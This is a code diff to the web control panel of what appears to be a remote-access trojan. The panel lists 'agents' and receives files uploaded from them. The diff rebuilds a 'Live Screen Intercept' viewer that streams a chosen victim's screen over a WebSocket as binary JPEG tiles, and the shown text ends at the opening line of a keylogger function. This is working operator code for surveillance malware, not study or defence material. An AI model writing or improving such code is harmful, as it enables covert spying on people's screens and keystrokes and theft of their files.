@@ -1197,21 +1197,16 @@
                 }
             });
 
+            // Deprecated: socket.on('stream_frame') handled by binary stream now
+            /*
             socket.on('stream_frame', data => {
                 const img = document.getElementById('stream-img-target');
                 if(data.frame && img) {
                     img.src = 'data:image/jpeg;base64,' + data.frame;
                     _streamFrameCount++;
-                    
-                    if(!_streamFpsTimer) {
-                        _streamFpsTimer = setInterval(() => {
-                            const fpsEl = document.getElementById('stream-fps-counter');
-                            if(fpsEl) fpsEl.textContent = _streamFrameCount + ' FPS';
-                            _streamFrameCount = 0;
-                        }, 1000);
-                    }
                 }
             });
+            */
 
             socket.on('upload_new', data => {
                 logTerminal(`File uploaded from agent: ${data.filename} (${data.size} bytes)`, 'warn');
@@ -1523,13 +1518,19 @@ function createDragWindow(id, title, icon, extraHtml = '') {
     win.innerHTML = `
         <div class="drag-header" id="${id}-header">
             <div class="drag-title"><i class="${icon}"></i> ${title}</div>
-            <div class="drag-close" onclick="document.getElementById('${id}').remove();"><i class="fa-solid fa-xmark"></i></div>
+            <div class="drag-close" onclick="closeDragWindow('${id}');"><i class="fa-solid fa-xmark"></i></div>
         </div>
         <div class="drag-content" id="${id}-content">
             ${extraHtml}
         </div>
     `;
     document.body.appendChild(win);
+
+    window.closeDragWindow = function(winId) {
+        const w = document.getElementById(winId);
+        if(w && typeof w.onClose === 'function') w.onClose();
+        if(w) w.remove();
+    };
     
     // Drag Logic
     const header = document.getElementById(`${id}-header`);
@@ -1595,13 +1596,64 @@ function startAudioStream() {
 }
 
 function startStream() {
-    const win = createDragWindow('stream-win', 'Live Screen Feed', 'fa-solid fa-desktop', 
-        '<div style="width:100%; height:100%; display:flex; flex-direction:column; position:relative;">' +
-        '<div style="position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.7); padding:4px 10px; border-radius:12px; font-size:0.8rem;" id="stream-fps-counter">0 FPS</div>' +
-        '<img id="stream-img-target" style="width:100%; height:100%; object-fit:contain; background:#000; border-radius:8px;">' +
-        '</div>');
-    win.style.width = '800px';
-    win.style.height = '500px';
+    const html = `
+        <div style="width:100%; height:100%; display:flex; flex-direction:column; position:relative; background:#000;">
+            <div style="position:absolute; top:10px; right:10px; background:rgba(0,0,0,0.8); padding:4px 10px; border-radius:12px; font-size:0.8rem; z-index:10; border:1px solid var(--accent); color:var(--accent);" id="stream-fps-counter">0 FPS</div>
+            <div style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8); padding:4px 10px; border-radius:12px; font-size:0.8rem; z-index:10; border:1px solid rgba(255,255,255,0.2); color:#fff;" id="stream-status">CONNECTING...</div>
+            <canvas id="stream-canvas" style="width:100%; height:100%; object-fit:contain;"></canvas>
+        </div>
+    `;
+    const win = createDragWindow('stream-win', 'Live Screen Intercept (ULTRA)', 'fa-solid fa-desktop', html);
+    win.style.width = '900px';
+    win.style.height = '600px';
+
+    const canvas = document.getElementById('stream-canvas');
+    const ctx = canvas.getContext('2d', { alpha: false });
+    const fpsEl = document.getElementById('stream-fps-counter');
+    const statusEl = document.getElementById('stream-status');
+
+    let framesThisSecond = 0;
+    setInterval(() => {
+        fpsEl.textContent = framesThisSecond + ' FPS';
+        framesThisSecond = 0;
+    }, 1000);
+
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const streamWs = new WebSocket(`${proto}//${location.host}/api/panel/stream_ws?cid=${selectedClient}`);
+    streamWs.binaryType = 'arraybuffer';
+
+    streamWs.onopen = () => { statusEl.textContent = 'LIVE'; statusEl.style.borderColor = 'var(--success)'; };
+    streamWs.onclose = () => { statusEl.textContent = 'OFFLINE'; statusEl.style.borderColor = 'var(--danger)'; };
+
+    streamWs.onmessage = async (msg) => {
+        const data = new Uint8Array(msg.data);
+        if (data.length < 11) return;
+
+        const type = data[0];
+        const x = data[1] | (data[2] << 8);
+        const y = data[3] | (data[4] << 8);
+        const w = data[5] | (data[6] << 8);
+        const h = data[7] | (data[8] << 8);
+        const imgLen = data[9] | (data[10] << 8); // Note: builder.go uses 2 bytes for len at pkt[9]
+
+        const imgData = data.slice(11);
+        const blob = new Blob([imgData], { type: 'image/jpeg' });
+        
+        try {
+            const bitmap = await createImageBitmap(blob);
+            // Auto-resize canvas if needed
+            if (canvas.width < x + w) canvas.width = x + w;
+            if (canvas.height < y + h) canvas.height = y + h;
+            
+            ctx.drawImage(bitmap, x, y, w, h);
+            bitmap.close();
+            framesThisSecond++;
+        } catch (e) {
+            console.error("Frame decode error", e);
+        }
+    };
+
+    win.onclose = () => { streamWs.close(); };
 }
 
 function startKeylogger() {
